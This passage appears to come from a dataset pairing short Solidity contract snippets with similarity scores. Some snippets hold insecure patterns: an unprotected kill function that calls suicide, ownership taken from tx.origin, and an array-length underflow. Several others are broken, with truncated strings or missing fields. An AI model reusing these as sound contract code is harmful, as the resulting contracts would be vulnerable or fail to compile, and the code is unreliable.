        string memory cidade, 
        string memory cartorio, 
        string memory livro, 
        string memory folha) 
        public 
        returns (bool)
        {
        
        Requerente memory req=Requerente(_nomeTabeliao, msg.sender, estado, cidade, cartorio, livro, folha);
        requerentes[msg.sender]=req;
        return true;
    }
}"
"contract C{
    uint public ConstructorUint;

    function C(uint SetConstructorUint)public{
        ConstructorUint = SetConstructorUint;
    }
}",0.5285902536727465,"contract InterfaceSpawn {
    uint public totalVotes;
    function getVotes(uint id) public view returns (uint _votes);
}"
"contract XXXX{
    address  owner;
    constructor()public
    {
        owner=msg.sender;

    }
        struct Project
        {


            string  proName;
            string  proDetails;
            uint  proPrice;
            address  proOwner;

        }
        Project [] public  pros;
        mapping (address => Project) public enrolled;

    function ProjectDetails(uint _price, string _name,string _projectDetails) public 
    
    {
        require(msg.sender!=owner);
        

        Project memory newPro = Project
        ({
            proPrice:_price,
            proOwner:msg.sender,
            proDetails:_projectDetails,
            proName:_name

            });
            pros.push(newPro);

            enrolled[msg.sender]=newPro;

    }
}",0.5659672038156829,"contract DSProxyFactory {

    event Created(address indexed sender, address indexed owner, address proxy, address cache);

    mapping(address=>bool) public isProxy;

    DSProxyCache public cache = new DSProxyCache();



    

    

    function build() public returns (DSProxy proxy) {

        proxy = build(msg.sender);

    }



    

    

    function build(address owner) public returns (DSProxy proxy) {

        proxy = new DSProxy(cache);

        emit Created(msg.sender, owner, address(proxy), address(cache));

        proxy.setOwner(owner);

        isProxy[proxy] = true;

    }

}"
"contract Judge {

    struct Misbehavior{
        address subject;   
        address device;
        string resource;
        string action;   
        string misbehavior;
        uint time;   
        uint penalty;   
    }

    mapping (address => Misbehavior[]) public MisbehaviorList;

    function misbeaviorJudge(
        address _subject, 
        address  _device, 
        string memory _resource,
        string memory _action,
        string memory _misbehavior,
        uint  _time) 
        public returns (uint  penalty) 
    {
        penalty = MisbehaviorList[_subject].length;
        MisbehaviorList[_subject].push(Misbehavior(_subject, _device, _resource, _action, _misbehavior, _time, penalty));
    }

    function getLatestMisbehavior(address _requester) public view 
        returns (address _subject, address _device, string memory _resource, string memory _action, string memory _misbehavior, uint _time)
    {
        uint latest = MisbehaviorList[_requester].length  - 1;
        _subject = MisbehaviorList[_requester][latest].subject;
        _device = MisbehaviorList[_requester][latest].device;
        _resource = MisbehaviorList[_requester][latest].resource;
        _action = MisbehaviorList[_requester][latest].action;
        _misbehavior = MisbehaviorList[_requester][latest].misbehavior;
        _time = MisbehaviorList[_requester][latest].time;
    }
}",0.5251086248067286,"contract OraclizeI {
    address public cbAddress;
    function query(uint _timestamp, string _datasource, string _arg) payable returns (bytes32 _id);
    function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) payable returns (bytes32 _id);
    function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) payable returns (bytes32 _id);
    function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) payable returns (bytes32 _id);
    function queryN(uint _timestamp, string _datasource, bytes _argN) payable returns (bytes32 _id);
    function queryN_withGasLimit(uint _timestamp, string _datasource, bytes _argN, uint _gaslimit) payable returns (bytes32 _id);
    function getPrice(string _datasource) returns (uint _dsprice);
    function getPrice(string _datasource, uint gaslimit) returns (uint _dsprice);
    function useCoupon(string _coupon);
    function setProofType(byte _proofType);
    function setConfig(bytes32 _config);
    function setCustomGasPrice(uint _gasPrice);
}"
"contract Magger {  
    function getOrderMag(int256 input) constant returns (int256){
        int counter=0;
        int temp = input;
        while((temp/10)>1){
            temp = temp/10;
            counter++;
        }
        return counter;
    }
}",0.5823347299353944,"contract MoonBook { 
  function MoonBook() {}

  bytes[] terms;

  function put(bytes term) {
    terms.push(term);
  }

  function get(uint256 index) constant returns (bytes) {
    return terms[index];
  }
}"
"contract Forwarder {

 address payable public receiversAddress = 0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C;
 address payable public feeAddress = 0xdD870fA1b7C4700F2BD7f44238821C26f7392148;

 constructor() payable public {
   uint amountToSendReceiver = msg.value-194740000000000;
   receiversAddress.transfer(amountToSendReceiver);
   feeAddress.transfer(194740000000000);
  }

 }",0.5022238999873543,"contract Ownable {
   address payable public owner;

   event OwnershipTransferred(address indexed _from, address indexed _to);

   constructor() public {
       owner = 0x07275AD68715cB21f7FCc326bb9Fc49238d1BE3E;
   }

   modifier onlyOwner {
       require(msg.sender == owner);
       _;
   }

   function transferOwnership(address payable _newOwner) public onlyOwner {
       owner = _newOwner;
   }
}"
"contract B{
    A a;
    constructor() public{
        a = A(0xE6c28FEF0491c7626c002131a2c833094f6135D3);       
    }
    function useCall() public{
        require(address(a).call(bytes4(sha3(""checkMe(uint)"")), 2));
    }

    function useDelegateCall() public{
        require(address(a).delegatecall(bytes4(sha3(""checkMe(uint)"")), 3));
    }
}",0.5027454119224225,"contract Proxiable {

    mapping (bytes4 => address) public targets;



    function initialize(address _target) public;



    function _replaceContract(address _target) internal {

        

        require(_target.delegatecall(0xc4d66de8, _target), ""Proxiable::_replaceContract: failed"");

    }

}"
"contract PersonalInfo{
    address public userAddress;
    address[] public Users;
    string public email;
    string public userName;


    function PersonalInfo ()public{
        userAddress = msg.sender;
        Users.push(userAddress);
    }
    function SavePersonalInfo(string Name, string Email)public{
        userName = Name;
        email = Email;
    }


}",0.5926741305621285,"contract TokenLike {
    string public name;
    uint8 public decimals;
    string public symbol;
    function totalSupply() public view returns (uint256);
    function balanceOf(address _who) public view returns (uint256);
    function allowance(address _owner, address _spender) public view returns (uint256);
}"
"contract customer{

bytes public name=""Alireza Kiakojouri"";

}",0.5487789631680937,"contract ShrimpFarmer{
    function buyEggs() public payable;
}"
"contract PowerOfTest {
    
    uint8 public placesA = 3;
    uint public EXP_A = 10**placesA;

    
    uint public placesB = 3;
    uint public EXP_B = 10**placesB;

    
    uint8 public placesC = 3;
    uint public EXP_C = 10**uint(placesC);

    
    
    

    
    function pow(uint base, uint8 exponent) returns(uint)
    {
        return base**exponent;
    }

    
    function pow2() returns(uint)
    {
        uint8 EXP_D = 3;
        return 10**EXP_D;
    }
}",0.5799207366888529,"contract RNG{



    

    function contribute(uint _block) public payable;



    

    function requestRN(uint _block) public payable {

        contribute(_block);

    }



    

    function getRN(uint _block) public returns (uint RN);



    

    function getUncorrelatedRN(uint _block) public returns (uint RN) {

        uint baseRN = getRN(_block);

        if (baseRN == 0)

        return 0;

        else

        return uint(keccak256(msg.sender,baseRN));

    }



}"
"contract ContractA{
  address[] instancesOfB;

  function ContractA(){
     
     ...
  }

 function updateB(){
   
   for(uint8 i=0; i < instancesOfB; i++) {
      instancesOfB[i].setAddressOfA(address(this));
   }
 }
}",0.5663462961467295,"contract EtherandomProxyI {
  function getContractAddress() constant returns (address _addr); 
  function getCallbackAddress() constant returns (address _addr); 
}"
"contract Department
{

    struct Departmentinfo 
    {
        string Dep_name;
        string email;
        string location;
        uint256 contact_no;

    }


    uint256 id=0;
    mapping(uint256 => Departmentinfo) Departments;
    uint256[] public DepartmentIds;


    function registerDepartment(string memory name, string memory location,string memory email, uint256 contact_no) public returns(uint256)    
         {
                id=id+1;
                Departmentinfo storage newDept = Departments[id];
                newDept.Dep_name = name;
                newDept.location=location;
                newDept.email = email;
                newDept.contact_no = contact_no;
                DepartmentIds.push(id);
         }

    function getDepartmentDetails(uint256 deptid) public view returns (string memory, string memory,string memory, uint256)
         {
               Departmentinfo storage d = Departments[deptid];
               return(d.Dep_name,d.location,d.email,d.contact_no);
         }

    function getdept(uint256 deptid) public view returns (string memory)
         {
                Departmentinfo storage d = Departments[deptid];
                return(d.Dep_name);
         }

    function comparestring(string memory a , string memory b) public view returns(bool)
        {
           return (keccak256(abi.encodePacked(a))==keccak256(abi.encodePacked(b)));

        }
        function getid() public view returns(uint256)
        {
            return id;
        }
        function getname(uint256 mid) public view returns(string memory)
        {
            Departmentinfo storage d=Departments[mid];
            return(d.Dep_name);
        }

    function validatedept(string memory email,uint256 contact_no) public view returns (uint256 )
        {
            uint256 deptid=0;
            uint256 n=id;
            for(uint256 i=1;i<=n;i++)
             {
                Departmentinfo storage d=Departments[i];
                string memory chck_email=d.email;
                uint256 chck_contact_no=d.contact_no;
                if((comparestring(chck_email,email)) && (chck_contact_no==contact_no))
                     {
                        deptid=id;
                         break;
                     }
             }

             return deptid;
        }",0.5605165469896466,"contract TulipCore is TulipSales {
  event ContractUpgrade(address newContract);
  event MaintenanceUpdate(bool maintenance);

  bool public underMaintenance = false;
  bool public deprecated = false;
  address public newContractAddress;

  function TulipCore() public {
    owner = msg.sender;
  }

  function getTulip(uint256 _id) public view returns (
    uint256 genes,
    uint256 createTime,
    string name
  ) {
    Tulip storage tulip = tulips[_id];
    genes = tulip.genes;
    createTime = tulip.createTime;

    bytes memory byteArray = new bytes(32);
    for (uint8 i = 0; i < 32; i++) {
      byteArray[i] = tulip.name[i];
    }
    name = string(byteArray);
  }

  function myTulips() public view returns (uint256[]) {
    uint256[] memory tulipsMemory = ownerToTulips[msg.sender];
    return tulipsMemory;
  }

  function myTulipsBatched(uint256 _startIndex, uint16 _maxAmount) public view returns (
    uint256[] tulipIds,
    uint256 amountRemaining
  ) {
    uint256[] storage tulipArr = ownerToTulips[msg.sender];
    int256 j = int256(tulipArr.length) - 1 - int256(_startIndex);
    uint256 amount = _maxAmount;

    if (j < 0) {
      return (
        new uint256[](0),
        0
      );
    } else if (j + 1 < _maxAmount) {
      amount = uint256(j + 1);
    }
    uint256[] memory resultIds = new uint256[](amount);

    for (uint16 i = 0; i < amount; i++) {
      resultIds[i] = tulipArr[uint256(j)];
      j--;
    }

    return (
      resultIds,
      uint256(j+1)
    );
  }

  function setMaintenance(bool _underMaintenance) public onlyAdmins {
    underMaintenance = _underMaintenance;
    MaintenanceUpdate(underMaintenance);
  }

  function upgradeContract(address _newContractAddress) public onlyAdmins {
    newContractAddress = _newContractAddress;
    deprecated = true;
    ContractUpgrade(_newContractAddress);
  }
}"
"contract VenueRegistry{
    struct Queue{
        uint head;
        uint tail;
        mapping(uint => address) queue;
    }

    struct Venue{
        uint id;
        Queue queue;
    }

    mapping (uint => Venue) public venues;

}",0.5439016254870201,"contract Zhtong {
    address public owner;
      uint private result;
      function Set(){
          owner = msg.sender;
      }
      function assign(uint x, uint y) returns (uint){
          result = x + y;
      }
}"
"contract BCSchema {

struct DefinitionV1{
   uint16   version;

   address adrs;
   uint8   id;
   string  name;
   string  description;
   string  bytecode;
 } 

struct DefinitionV2{
   uint16   version;

   address adrs;
   uint8   id;
   string  name;
   string  description;
   string  bytecode;
   string  ABI;
 }
}",0.5986252040179438,"contract TokenFactory {

    event TokenCreated(

        address indexed addr,

        string  name,

        string  symbol,

        uint8   decimals,

        uint    totalSupply,

        address firstHolder

    );

    

    

    

    

    

    

    function createToken(

        string  name,

        string  symbol,

        uint8   decimals,

        uint    totalSupply

        )

        external

        returns (address addr);

}"
"contract Sample{

  struct Info
  {
    address pubKey;        
    bytes32 Id;
  }

  mapping(address => Info) public userMap;

  
  function register(bytes32 orgId, address pubKey) public returns(bool){
    if (pubKey == 0x0 || orgId == 0x0 ) {
        revert(""Pub Key & Org Id are mandatory"");
    }
    if (userMap[pubKey].pubKey == pubKey) {
        revert(""User already exists"");
    }
    userMap[pubKey].pubKey = pubKey;
    userMap[pubKey].orgId = orgId;
    return true;
  }
  
  function getUser(address pubKey) public returns(bytes32 orgId){
    orgId = userMap[pubKey].orgId;
  }
}",0.555404239765794,"contract GlobalStorageMultiId { 

	uint256 public regPrice;

	function registerUser(bytes32 _id) payable returns(bool);

	function changeAddress(bytes32 _id , address _newAddress) returns(bool);

	function setUint(bytes32 _id , bytes32 _key , uint _data , bool _overwrite) returns(bool);

	function getUint(bytes32 _id , bytes32 _key) constant returns(uint);

	event Error(string _string);

	event RegisteredUser(address _address , bytes32 _id);

	event ChangedAdd(bytes32 _id , address _old , address _new);

}"
"contract AddNewVotingBuilder is BaseBuilder
{
    function build()
        external
    {
        emit NewVoting(address(new AddNewVoting()));
    }
}",0.5420952207476359,"contract WhitelistProviderInterface is Provider {
    function isAllowed(address account) external view returns(bool);
}"
"contract caller_tracker_string
{
    address curr_tracker;
    address owner; 
    function change_contract(address addr)
    {
        curr_tracker=addr;
    }
    function caller_tracker_string(address current_trcker)
    {
        owner=tx.origin;
        curr_tracker=current_trcker;        
    }
    function adduser(address usr_new,uint ts,string tr)
    {
        curr_tracker.call(bytes4(sha3(""callme(address,uint256,string)"")),usr_new,ts,tr);
    }
    function kill()
        { 
        suicide(owner);
        }
}",0.5478541248036547,"contract Registrar {
	event Changed(string indexed name);

	function owner(string _name) constant returns (address o_owner);
	function addr(string _name) constant returns (address o_address);
	function subRegistrar(string _name) constant returns (address o_subRegistrar);
	function content(string _name) constant returns (bytes32 o_content);
}"
"contract RockBand is Group{
    struct MusicianExtra {
        bytes32 instrument;
    }
    mapping (address => MusicianExtra) membersMusicianExtra;
}",0.5015267019374168,"contract SafetherStorage {
    
    
    struct Depositor {
        bytes8     _token;
        uint256[3]  _data;
    }
    
    mapping (address=>Depositor) internal _depositor;
}"
"contract FootballClub is Group{
    struct PlayerExtra {
        bytes32 position;
    }
    mapping (address => PlayerExtra) membersFootbalExtra;
}",0.5258983252937885,"contract SafetherStorage {
    
    
    struct Depositor {
        bytes8     _token;
        uint256[3]  _data;
    }
    
    mapping (address=>Depositor) internal _depositor;
}"
"contract MyContract {
    uint public len;
    mapping(uint=>byte) public names;
    function initContracts(byte[] contractNames_){
        for(uint i=0;i<contractNames_.length;i++){
            names[i]=contractNames_[i];
        }
        len=contractNames_.length;
    }
}",0.50834285760589,"contract ContractResolver {

    bool public locked_forever;



    function get_contract(bytes32) public view returns (address);



    function init_register_contract(bytes32, address) public returns (bool);

}"
"contract HelloWorld {

uint public userCount = 0;


constructor() public{
    createUser (""Monicka"", ""Akilan"", 30, ""Chennai"");
}

  struct User {
    uint id;
    string firstName;
    string lastName;
    uint age;
    string city;    
    uint tipAmount;
    address payable author;
  }
event profileTips(string firstName, string lastName, uint age, 
 string city, uint tipAmount, address payable author);

mapping(uint => User) public Users;

 function createUser(string memory _firstName, string memory _lastName, uint _age, 
 string memory  _city) public payable{
    userCount ++;
    
     Users[userCount] = User(userCount, _firstName, _lastName, _age, _city, 20, msg.sender);
    emit profileTips(_firstName, _lastName, _age,  _city, msg.value,  msg.sender);
 }
}",0.5784786054228405,"contract OrganizationalCertification  {



    

    address public registryAddress;



    string public CompanyName;

    string public Norm;

    string public CertID;

    uint public issued;

    uint public expires;

    string public Scope;

    string public issuingBody;



    

    constructor(

        string memory _CompanyName,

        string memory _Norm,

        string memory _CertID,

        uint _issued,

        uint _expires,

        string memory _Scope,

        string memory _issuingBody)

        public

    {

        require(_issued < _expires);



        registryAddress = msg.sender;



        CompanyName = _CompanyName;

        Norm =_Norm;

        CertID = _CertID;

        issued = _issued;

        expires = _expires;

        Scope = _Scope;

        issuingBody = _issuingBody;

    }



    

    function deleteCertificate() public {

        require(msg.sender == registryAddress);

        selfdestruct(tx.origin);

    }



}"
"contract Sha_hash_bytes_links
 {
     function return_int()returns(uint x) 
        {
            return(0);
        }
  }",0.5955471621608198,"contract EventsHistory {
    function versions(address) constant returns(uint);
}"
"contract A {
    function indirect() {
        B.doit();
    }
    function direct() {
        C.doit();
    }
}",0.5518597646450422,"contract EndLike {
    function cage() public;
    function cage(bytes32) public;
}"
"contract blockchain2emailAPI {function SendEmail(string x, string y) returns(bool) {}}",0.5723270424660781,"contract web3Voorbeeld {

    

    

    function ping() public view returns(string) {

        return(""pong"");

    }

}"
"contract Alarm is usingOraclize {

    function Alarm() {
       oraclize_query(1*day, ""URL"", """");
    }

    function SendEmail(string EmailAddress, string Message) internal returns (bool){
        return (blockchain2emailAPI(0xde5ebd0b8879b0a42b23b37e4d76a5e21a0bef4b).
            SendEmail.value(1000000000000000)(EmailAddress, Message));
    }

    function __callback(bytes32 myid, string result) {
        if (msg.sender != oraclize_cbAddress()) throw;
        SendEmail(""example@email.com"", ""Your message goes here."");
    }

}",0.5051382129691977,"contract HashtagList is Ownable {

    mapping (address => string) storedMap;

    function setBytesRaw(string x) {
        storedMap[msg.sender] = x;
    }

    function setBytes(address _hashtagAddress, string x) {
        IHashtag hashtag = IHashtag(_hashtagAddress);
        if (msg.sender != hashtag.getConflictResolver()) {
            throw;
        }

        storedMap[_hashtagAddress] = x;
    }

    function getMap(address _hashtagAddress) constant returns (string returnValue) {
        returnValue = storedMap[_hashtagAddress];
    }

}"
"contract Bank {
    struct Customer {
        uint age;
    }

    Customer[][] customers;

    function foo() public {
        if (customers.length > 0) {
            Customer[] storage northBranch = customers[0];
            if (northBranch.length > 1) {
                Customer storage customer = northBranch[1];
                customer.age = 23;
            }
        } else {
            Customer memory bob;
            bob.age = 34;
            customers.length += 1;
            customers[0].push(bob);
        }
    }

    function get() external view returns (Customer[][] memory) {
        return (customers);
    }
}",0.5208060981055208,"contract Testable is Ownable {



    

    

    bool public isTest;



    uint private currentTime;



    constructor(bool _isTest) internal {

        isTest = _isTest;

        if (_isTest) {

            currentTime = now; 

        }

    }



    modifier onlyIfTest {

        require(isTest);

        _;

    }



    function setCurrentTime(uint _time) external onlyOwner onlyIfTest {

        currentTime = _time;

    }



    function getCurrentTime() public view returns (uint) {

        if (isTest) {

            return currentTime;

        } else {

            return now; 

        }

    }

}"
"contract A is B {
  function f() {  
    u = 3;
  }
  function f1() { 
    super.f();
  }
  function f2() { 
    B.f();
  }
  function f3() { 
    C.f();
  }
}",0.5482388922231122,"contract Counter {
  uint i=1;
  function inc() {
    i=i+1;
  }
  function get() constant returns (uint) {
    return i;
  }
}"
"contract ClassRoom {
    address studentAddr;
    Student student;
    function ClassRoom(address addr) {
        studentAddr = addr;
        student = Student(addr);
    }

    
    function updateTookTest (uint ID) {
        student.updateStudent(ID);
    }
    
    function readStudentStruct (uint ID) constant returns (string, uint, bool) {
        return student.studentNames(ID);
    }
}",0.5931186952373206,"contract AWMain {
        function rewardDistribution(address addr, uint amount) external returns(uint);
        function getPlayer(address addr) external view returns(uint, address, address[]);
        function releaseStaticPoolAndV4(uint usdtVal) external;
        function updateRevenue(address addr, uint amount, bool flag) external;
    }"
"contract B {
    ERC20 token = ERC20(0x...);
    C c = C(0x...);

    function helpMeBuyFoo() external {
        
        

        token.approve(c, 1000); 
        c.buyFoo(msg.sender);   
    }
}",0.5388454775066619,"contract ERC20 {

    function transferFrom(address from, address to, uint tokens) external returns (bool success);

}"
"contract BreadCrumbs {

    uint public prevChange;

    event LogChange(string arg1, string arg2, string arg3. uint previous);

    function change(string memory _arg1, string memory _arg2, string memory _arg3) public {
        emit LogChange(_arg1, _arg2, _arg3, prevChange);
        prevChange = block.number;
    }

}",0.5508046239890562,"contract manyTests {
    uint256 a;
    string b = ""I am view"";
    
    function addSomeRandomStuff(address[][] memory tokens) public {
         a = a + 1;
    }
    
    function showMePure() pure public returns (string memory) {
        return ""I am pure"";
    }
    
    function showMeView() view public returns (string memory) {
        return b;
    }
}"
"contract Twitter is accountProviderBase {
  Lookup lookup;

  address owner;

  modifier owneronly { if (msg.sender == owner) _ }

  function setOwner(address addr) owneronly {
    owner = addr;
  }

  function Twitter() {
    owner = msg.sender;
  }

  function setLookup(address addr) owneronly {
    lookup = Lookup(addr);
  }

  
  mapping (bytes32 => bytes32) expectedId;

  
  mapping (bytes32 => bool) isVerification;

  
  function __callback(bytes32 myid, string result, bytes proof) {
    if (msg.sender != oraclize_cbAddress()) throw;

    if (isVerification[myid])
      processVerification(myid, result);
    else
      processScore(myid, result);

    
    delete expectedId[myid];
    delete isVerification[myid];
  }

  function processScore(bytes32 myid, string result) internal {
    uint followers = parseInt(result);
    uint24 newScore = 1000000;
    if (followers / 10000 == 0)
      newScore = 100 * uint24(followers % 10000);

    Storage(lookup.addrStorage()).updateScore(lookup.accountProvider_TWITTER(), expectedId[myid], newScore);
  }

  
  function score(bytes32 id, string userId) coupon(""HackEtherCamp"") {
    bytes memory _userId = bytes(userId);
    string memory head = ""html(https:
    bytes memory _head = bytes(head);
    string memory tail = "").xpath(
    bytes memory _tail = bytes(tail);
    string memory query = new string(_head.length + _userId.length + _tail.length);
    bytes memory _query = bytes(query);
    uint i = 0;
    for (uint j = 0; j < _head.length; j++)
      _query[i++] = _head[j];
    for (j = 0; j < _userId.length; j++)
      _query[i++] = _userId[j];
    for (j = 0; j < _tail.length; j++)
      _query[i++] = _tail[j];
    oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);
    bytes32 oraclizeId = oraclize_query(""URL"", query);
    expectedId[oraclizeId] = id;
    isVerification[oraclizeId] = false;
  }

  function processVerification(bytes32 myid, string result) internal {
    
    string memory expected = iudexIdToString(expectedId[myid]);
    bool asExpected = indexOf(result, expected) > -1;
    Storage(lookup.addrStorage()).updateAccount(lookup.accountProvider_TWITTER(), expectedId[myid], asExpected, myid);
  }

  
  function verifyUrl(string userId, string proofLocation) internal returns (bool){
    bytes memory _userId = bytes(userId);
    string memory twitterPrefix = "":
    bytes memory _twitterPrefix = bytes(twitterPrefix);
    string memory urlHead = new string(_twitterPrefix.length + _userId.length + 1);
    bytes memory _urlHead = bytes(urlHead);
    uint i = 0;
    for (uint j = 0; j < _twitterPrefix.length; j++)
      _urlHead[i++] = _twitterPrefix[j];
    for (j = 0; j < _userId.length; j++)
      _urlHead[i++] = _userId[j];
    _urlHead[i++] = byte(""/"");

    if (indexOf(proofLocation, string(_urlHead)) == -1)
      return false;

    return true;
  }

  
  function verify(bytes32 id, string userId, string proofLocation) coupon(""HackEtherCamp"") {
  

    
    if (!verifyUrl(userId, proofLocation))
      throw;

    
    string memory head = ""html("";
    bytes memory _head = bytes(head);
    string memory tail = "").xpath(
    bytes memory _tail = bytes(tail);

    bytes memory _tweetUrl = bytes(proofLocation);

    string memory query = new string(_head.length + _tail.length + _tweetUrl.length + 2);
    bytes memory _query = bytes(query);
    uint i = 0;
    for (uint j = 0; j < _head.length; j++)
      _query[i++] = _head[j];
    for (j = 0; j < _tweetUrl.length; j++)
      _query[i++] = _tweetUrl[j];
    for (j = 0; j < _tail.length; j++)
      _query[i++] = _tail[j];
    _query[i++] = 0;

    oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);
    bytes32 oraclizeId = oraclize_query(""URL"", query);
    expectedId[oraclizeId] = id;
    isVerification[oraclizeId] = true;
  }
}",0.5121548415045807,"contract LEOcoin is IERC20 {

    using SafeMath for uint256;



    

    string private _name;

    string private _symbol;

    uint8 private _decimals;



    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowed;

    uint256 private _totalSupply;



    address private _isMinter;

    uint256 private _cap;





    constructor (address masterAccount, uint256 premined, address minterAccount) public {

        _name = ""LEOcoin"";

        _symbol = ""LEO"";

        _decimals = 18;

        _cap = 4000000000*1E18;



        _isMinter = minterAccount;



        _totalSupply = _totalSupply.add(premined);

        _balances[masterAccount] = _balances[masterAccount].add(premined);

        emit Transfer(address(0), masterAccount, premined);

    }



    

    function name() public view returns (string memory) {

        return _name;

    }



    

    function symbol() public view returns (string memory) {

        return _symbol;

    }



    

    function decimals() public view returns (uint8) {

        return _decimals;

    }



    

    function totalSupply() public view returns (uint256) {

        return _totalSupply;

    }



    

    function balanceOf(address owner) public view returns (uint256) {

        return _balances[owner];

    }



    

    function allowance(address owner, address spender) public view returns (uint256) {

        return _allowed[owner][spender];

    }



    

    function transfer(address to, uint256 value) public returns (bool) {

        _transfer(msg.sender, to, value);

        return true;

    }



    

    function approve(address spender, uint256 value) public returns (bool) {

        _approve(msg.sender, spender, value);

        return true;

    }



    

    function transferFrom(address from, address to, uint256 value) public returns (bool) {

        _transfer(from, to, value);

        _approve(from, msg.sender, _allowed[from][msg.sender].sub(value));

        return true;

    }



    

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {

        _approve(msg.sender, spender, _allowed[msg.sender][spender].add(addedValue));

        return true;

    }



    

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {

        _approve(msg.sender, spender, _allowed[msg.sender][spender].sub(subtractedValue));

        return true;

    }



    

    function _transfer(address from, address to, uint256 value) internal {

        require(to != address(0));



        _balances[from] = _balances[from].sub(value);

        _balances[to] = _balances[to].add(value);

        emit Transfer(from, to, value);

    }



    

    function _approve(address owner, address spender, uint256 value) internal {

        require(spender != address(0));

        require(owner != address(0));



        _allowed[owner][spender] = value;      

    }



    

    function mint(address account, uint256 value) public onlyMinter  {

        require(account != address(0));

        require(totalSupply().add(value) <= _cap);



        _totalSupply = _totalSupply.add(value);

        _balances[account] = _balances[account].add(value);

        emit Transfer(address(0), account, value);

    }





    

    function cap() external view returns (uint256) {

        return _cap;

    }



    

    function currentMinter() external view returns (address) {

        return _isMinter;

    }





    

    function changeMinter(address newMinter) external onlyMinter {

        _isMinter = newMinter;

    } 



    modifier onlyMinter() {

        require(msg.sender==_isMinter);

        _;

    }





    function batchTransfer(address[] memory accounts, uint256[] memory values) public {

        for (uint i=0; i<accounts.length; i++) {

            

            if (accounts[i]==address(0)) {

                continue;

            }

            transfer(accounts[i], values[i]);

        }

    }



    function batchMint(address[] memory accounts, uint256[] memory values) public {

        for (uint i=0; i<accounts.length; i++) {

            

            if (accounts[i]==address(0)) {

                continue;

            }



            mint(accounts[i], values[i]);

        }   

    }





}"
"contract X {

    struct Voter {
        bytes32 data;
        uint amount;
    }
    mapping(address => Voter) voter;
    address[] voterIndex;
    uint voter_count;

    event Deposit(address a, uint b);

    function sendEther(bytes32 data) public payable  {
      address sender = msg.sender;
      uint value = msg.value;
      voter[sender].data = data;
      voter[sender].amount = value;
      voterIndex[voter_count] = sender;
      voter_count = voter_count + 1;
      Deposit(sender, value);
    }

}",0.5904383569752703,"contract CommunityChest {

    

    address owner;

    

    event Deposit(uint256 value);

    event Transfer(address to, uint256 value);

    

    constructor () public {

        owner = msg.sender;

    }

    

    function send(address payable to, uint256 value) public onlyOwner {

        to.transfer(value);

        emit Transfer(to, value);

    }



    function getBalance() public view returns (uint256) {

        return address(this).balance;

    }

    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

}"
"contract MarketMaker {
    address iplogic;
    address ipxaddr;

    event log(address ipx);

    function MarketMaker(address _iplogic, address _ipx) {
        iplogic = _iplogic;
        ipxaddr = _ipx;
        log(ipxaddr);
        log(iplogic);
    }

    function createNewMarket(string prop, uint256 minBet, bool initUtility) returns (address, address) {
        log(ipxaddr);
        log(iplogic);
    }
}",0.5826817655657659,"contract ETPMap{

     mapping (address => string) internal address_map;

     event MapAddress(address, string);

     function get_address(address addr) constant public returns (string) {

         return address_map[addr];

     }



     function map_address(string etpaddr) public {

         address addr = msg.sender;

         address_map[addr] = etpaddr;

         MapAddress(addr, etpaddr);

     }

  }"
"contract MyToken {

    struct Certificate {
      uint64 certificateId;
      uint64 meterId;
      uint32 timestamp;
      uint48 value;
      address[] owners;
      mapping (address => uint48) ownershipSplit;
      bool burned;
    }

    mapping (uint64 => Certificate) public certificates;
    uint64 public numCertificates = 1;

    function MyToken() public {
      
    }

    function produceCertificate(
      uint64 meterId,
      uint32 timestamp,
      uint48 value,
      address owner
      ) public {
        
        
        Certificate storage newCertificate = certificates[numCertificates];
        newCertificate.meterId = meterId;
        newCertificate.timestamp = timestamp;
        newCertificate.value = value;
        newCertificate.owners.push(owner);
        newCertificate.ownershipSplit[owner] = value;
        newCertificate.burned = false; 
        newCertificate.certificateId = numCertificates;
        numCertificates= numCertificates +1;
    }

}",0.5018379516894397,"contract PrivateBet {



     

    event NewBet(address indexed _address);

    

     

    uint8 private paused = 0;



     

    uint private price;

    

     

    bytes16 private name;

    

     

    address private owner;



     

    address[] public users;

    

    

    constructor(bytes16 _name, uint _price) public {

        owner = msg.sender;

        name = _name;

        price = _price;

    }

    

    

    function() public payable {

        

        

        require(paused == 0, 'paused');

        

        

        require(tx.origin == msg.sender, 'not allowed');

        

        

        require(msg.value >= price, 'low amount');



        

        users.push(msg.sender);

        

        

        emit NewBet(msg.sender);

         

         

        owner.transfer(msg.value);

    }

    

    

    function details() public view returns (

        address _owner

        , bytes16 _name 

        , uint _price 

        , uint _total

        , uint _paused

        ) {

        return (

            owner

            , name

            , price

            , users.length

            , paused

        );

    }

    

    

    function pause() public {

        

        require(msg.sender == owner, 'not allowed');

        

        paused = 1;

    }

}"
"contract ArrayStuff {

  bytes32[] d;

  function makeHuge() public {
      uint massive = uint(0)-uint(1); 
      d.length = massive;
  }
}",0.5939490889996865,"contract IExitHandler {

  function startExit(bytes32[] memory, bytes32[] memory, uint8, uint8) public payable;

}"
"contract EthereumLottery {

    uint[6] array;
    uint[6] winners;
    string warning = ""please be sure to bet below 67 for the first 5 balls and 34 for the 6th"";
    address owner;
    uint addr = address(this).balance;
    uint nonce = 1;
    uint startTime = now;
    int8 fdsa;              

    constructor() public {
      owner = msg.sender;
    }

    function WARNING() public view returns (string memory) {
        return warning;
    }

    function PickYourNumbers(uint8 firstBall, uint8 secondBall, 
      uint8 thirdBall, uint8 fourthBall, 
      uint8 fithBall, uint8 powerballllll) public {
        if (firstBall <= 66) array[0] = firstBall;
        if (secondBall <= 66) array[1] = secondBall;
        if (thirdBall <= 66) array[2] = thirdBall;
        if (fourthBall <= 66) array[3] = fourthBall;
        if (fithBall <= 66) array[4] = fithBall;
        if (powerballllll <= 66) array[5] = powerballllll;
    }

    function GetHash() public view returns (uint[6] memory) {
        return array;
    }

                   
    function StartTheLotto(int8 asdf) public returns (uint[6] memory) {
        fdsa = asdf; 
        nonce++;
        winners[0] = random();
        nonce++;
        winners[1] = random();
        nonce++;
        winners[2] = random();
        nonce++;
        winners[3] = random();
        nonce++;
        winners[4] = random();
        nonce++;
        winners[5] = random();
    }


    function lottoWinners() public view returns (uint[6] memory) {
